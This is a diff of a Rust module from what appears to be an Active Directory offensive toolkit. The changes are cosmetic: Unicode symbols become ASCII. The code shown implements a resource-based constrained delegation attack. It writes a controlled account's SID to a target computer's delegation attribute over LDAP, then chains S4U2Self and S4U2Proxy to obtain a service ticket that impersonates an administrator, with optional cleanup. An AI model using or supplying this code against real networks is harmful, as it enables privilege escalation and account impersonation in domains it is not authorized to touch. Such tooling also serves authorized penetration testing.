@@ -1,4 +1,4 @@
-//! Resource-Based Constrained Delegation (RBCD) — Write to
+//! Resource-Based Constrained Delegation (RBCD) -- Write to
 //! msDS-AllowedToActOnBehalfOfOtherIdentity to allow a controlled
 //! account to impersonate users to the target via S4U2Self+S4U2Proxy.
 //!
@@ -6,7 +6,7 @@
 //! 1. Control an account with an SPN (or create a machine account)
 //! 2. Write the controlled account's SID to the target's
 //!    msDS-AllowedToActOnBehalfOfOtherIdentity attribute
-//! 3. Perform S4U2Self → S4U2Proxy to get a ticket as admin to the target
+//! 3. Perform S4U2Self -> S4U2Proxy to get a ticket as admin to the target
 
 use crate::runner::HuntConfig;
 use colored::Colorize;
@@ -16,9 +16,9 @@ use overthrone_core::proto::ldap;
 use serde::{Deserialize, Serialize};
 use tracing::{error, info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Configuration
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 /// Structure
 #[derive(Debug, Clone)]
 pub struct RbcdConfig {
@@ -59,9 +59,9 @@ impl Default for RbcdConfig {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Result
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 /// Structure
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct RbcdResult {
@@ -81,9 +81,9 @@ pub struct RbcdResult {
     pub error: Option<String>,
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Security Descriptor Construction
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Build a minimal security descriptor (DACL) that grants the controlled
 /// account's SID the right to act on behalf of other identities.
@@ -168,9 +168,9 @@ fn parse_sid_string(sid_str: &str) -> Result<Vec<u8>> {
     Ok(bytes)
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // LDAP Operations
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
 /// NOTE: You must add `modify_replace` to your LdapSession impl in
@@ -287,12 +287,12 @@ async fn resolve_computer_dn(config: &HuntConfig, computer_name: &str) -> Result
         })
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Public Runner
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
-    info!("{}", "═══ RBCD ATTACK ═══".bold().red());
+    info!("{}", "=== RBCD ATTACK ===".bold().red());
 
     if rc.controlled_account.is_empty() || rc.target_computer.is_empty() {
         return Err(OverthroneError::custom(
@@ -322,13 +322,13 @@ pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
             result.attribute_written = true;
             info!(
                 " {} RBCD attribute written (SID: {})",
-                "✓".green(),
+                "[+]".green(),
                 rc.controlled_sid.cyan()
             );
         }
         Err(e) => {
             result.error = Some(format!("Failed to write RBCD attribute: {e}"));
-            error!(" {} RBCD write failed: {}", "✗".red(), e);
+            error!(" {} RBCD write failed: {}", "[-]".red(), e);
             return Ok(result);
         }
     }
@@ -354,20 +354,20 @@ pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
 
     info!(
         " {} TGT for {} obtained",
-        "✓".green(),
+        "[+]".green(),
         rc.controlled_account.bold()
     );
 
-    // Step 4: S4U2Self → impersonate target user
+    // Step 4: S4U2Self -> impersonate target user
     let s4u2self_ticket = kerberos::s4u2self(&config.dc_ip, &tgt, &rc.impersonate_user).await?;
 
     info!(
         " {} S4U2Self as {} obtained",
-        "✓".green(),
+        "[+]".green(),
         rc.impersonate_user.bold()
     );
 
-    // Step 5: S4U2Proxy → get ticket for target service
+    // Step 5: S4U2Proxy -> get ticket for target service
     let target_spn = rc
         .target_spn
         .clone()
@@ -379,14 +379,14 @@ pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
             result.success = true;
             info!(
                 " {} S4U2Proxy ticket for {} as {} obtained!",
-                "✓".green().bold(),
+                "[+]".green().bold(),
                 target_spn.bold().cyan(),
                 rc.impersonate_user.bold().red()
             );
         }
         Err(e) => {
             result.error = Some(format!("S4U2Proxy failed: {e}"));
-            warn!(" {} S4U2Proxy failed: {}", "✗".red(), e);
+            warn!(" {} S4U2Proxy failed: {}", "[-]".red(), e);
         }
     }
 
@@ -395,10 +395,10 @@ pub async fn run(config: &HuntConfig, rc: &RbcdConfig) -> Result<RbcdResult> {
         match clear_rbcd_attribute(config, &target_dn).await {
             Ok(_) => {
                 result.cleaned_up = true;
-                info!(" {} RBCD attribute cleaned up", "✓".green());
+                info!(" {} RBCD attribute cleaned up", "[+]".green());
             }
             Err(e) => {
-                warn!(" {} Cleanup failed: {}", "⚠".yellow(), e);
+                warn!(" {} Cleanup failed: {}", "[!]".yellow(), e);
             }
         }
     }
